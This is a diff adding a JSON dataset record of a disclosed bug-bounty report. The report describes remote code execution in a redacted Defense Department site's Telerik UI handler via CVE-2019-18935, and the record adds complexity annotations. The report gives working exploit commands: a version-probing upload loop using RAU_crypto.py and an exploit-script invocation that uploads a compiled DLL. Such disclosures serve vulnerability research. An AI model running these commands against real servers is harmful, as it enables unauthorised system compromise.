@@ -1,0 +1,46 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "un4gi ",
+  "title": "Remote Code Execution via CVE-2019-18935",
+  "content": "\nSummary:\nThe website at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau is vulnerable to CVE-2017-11317 and CVE-2019-18935, allowing an attacker to upload arbitrary files and gain remote code execution on the underlying system.\nStep-by-step Reproduction Instructions\nBrowse to https://\u2588\u2588\u2588\u2588\u2588/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau. You will see the following message confirming that the file upload handler is registered: { \"message\" : \"RadAsyncUpload handler is registered succesfully, however, it may not be accessed directly.\" }\nFrom here on out I used the write-up at https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui for reference.\nWith a slight modification to the script in the BishopFox write-up, I was able to determine the software version:\nCode 298 Bytes\n1echo 'test' > testfile.txt\n2for VERSION in $(cat versions.txt); do\n3            echo -n \"$VERSION: \"\n4                python3 RAU_crypto.py -P 'C:\\Windows\\Temp' \"$VERSION\" testfile.txt https://\u2588\u2588\u2588\u2588\u2588/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null | grep fileInfo || echo\n5        done\nThe versions.txt file I used has been attached to this report for ease of replication.\n4. As shown in the results, the version is vulnerable to CVE-2017-11317 and I was able to successfully upload the testfile.txt.\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n5. Next, on a Windows system with Visual Studio installed, compile a dll using build_dll.bat as shown in the BishopFox article.\n6. Using python3 CVE-2019-18935.py -u https://\u2588\u2588\u2588\u2588/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau -v 2016.2.607 -f 'C:\\Windows\\Temp' -p <your_created_dll>.dll, if you compiled using the PoC in the article you should be able to make the server hang for around 10 seconds.\n7. Once the sleep is over, the server should respond with a similar message as follows: [*] Response time: 12.34 seconds showing the server is vulnerable to CVE-2019-18935.\n8. At this point you can upload a reverse shell payload, but I feel the sleep PoC is good enough to prove RCE.\nProduct, Version, and Configuration (If applicable)\nTelerik UI 2016.2.607\nReferences\nhttps://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui\nhttps://github.com/bao7uo/RAU_crypto\nhttps://github.com/noperator/CVE-2019-18935\nhttps://hackerone.com/reports/838196\nSuggested Mitigation/Remediation Actions\nFollow recommended fix actions at https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization\nImpact\nRemote Code Execution/Total system compromise.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Deserialization of Untrusted Data"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1597356660,
+  "report_url": "https://hackerone.com/reports/913695",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Browse to the vulnerable Telerik.Web.UI.WebResource.axd endpoint to confirm handler registration"
+    ],
+    [
+      2,
+      "Use a version detection script to identify the vulnerable Telerik UI version (2016.2.607)"
+    ],
+    [
+      3,
+      "Compile a malicious DLL on a Windows system with Visual Studio"
+    ],
+    [
+      4,
+      "Use the CVE-2019-18935 exploit script to upload the DLL and trigger RCE (proven via sleep delay)"
+    ]
+  ],
+  "vuln_description": "Remote Code Execution via CVE-2019-18935 in Telerik UI, allowing arbitrary file upload and system compromise through a vulnerable file upload handler.",
+  "reason": "This vulnerability requires chaining multiple components (version detection, crypto bypass, DLL compilation, and exploit delivery) and leverages a known but non-trivial cryptographic weakness in Telerik's file upload mechanism. However, the attack follows well-documented public exploit chains.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": "838196"
+}
